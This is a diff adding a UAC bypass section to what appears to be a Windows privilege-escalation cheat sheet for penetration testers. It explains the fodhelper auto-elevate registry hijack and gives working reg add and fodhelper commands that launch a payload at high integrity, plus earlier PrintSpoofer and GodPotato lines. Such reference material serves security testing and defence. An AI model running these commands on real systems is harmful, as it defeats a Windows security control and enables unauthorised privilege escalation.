@@ -51,3 +51,55 @@ whoami /priv
 .\PrintSpoofer64.exe -i -c cmd
 .\GodPotato-NET4.exe -cmd "cmd /c whoami"
 ```
+
+## UAC Bypass
+
+UAC (User Account Control) splits admin accounts into two tokens: a Medium integrity token for normal operations and a High integrity token for elevated actions. Bypassing UAC means escalating from Medium to High integrity without triggering a consent prompt.
+
+Check your current integrity level before attempting any bypass:
+
+```powershell wrap
+whoami /groups | findstr "Label"
+# Medium Mandatory Level → bypass needed
+# High Mandatory Level   → already elevated
+```
+
+### fodhelper
+
+`fodhelper.exe` (`C:\Windows\System32\fodhelper.exe`) is a Windows binary that manages optional features. Its application manifest declares `autoElevate: true`, so the Windows Application Information service automatically elevates it to High integrity on launch with no UAC prompt shown.
+
+When `fodhelper.exe` starts it queries:
+
+```
+HKCU\Software\Classes\ms-settings\Shell\Open\command
+```
+
+This key does not exist by default. `HKCU` is always writable by the current user regardless of integrity level. By creating this key and pointing it at a payload, the auto-elevated `fodhelper.exe` launches it at High integrity.
+
+The `DelegateExecute` value is required: without it Windows treats the command as a plain shell execution and the auto-elevation path may not trigger. With it present (value can be empty), Windows routes through COM activation, which is what causes `fodhelper` to inherit its elevated context onto your payload.
+
+```powershell wrap
+# Set the payload path
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\ProgramData\Payload\agent.exe" /f
+
+# Create the DelegateExecute value (empty value, presence is what matters)
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f
+
+# Trigger
+fodhelper.exe
+
+# Clean up after
+reg delete HKCU\Software\Classes\ms-settings /f
+```
+
+<CardGroup cols={3}>
+  <Card title="Creative UAC Bypasses" icon="link" href="https://g3tsyst3m.com/privilege%20escalation/Creative-UAC-Bypass-Methods-for-the-Modern-Era/">
+    Modern UAC bypass techniques and primitives
+  </Card>
+  <Card title="Elastic: UAC Techniques & Detection" icon="link" href="https://www.elastic.co/security-labs/exploring-windows-uac-bypasses-techniques-and-detection-strategies">
+    Bypass techniques mapped to detection strategies
+  </Card>
+  <Card title="UACME" icon="github" href="https://github.com/hfiref0x/UACME">
+    Comprehensive UAC bypass collection (60+ methods)
+  </Card>
+</CardGroup>
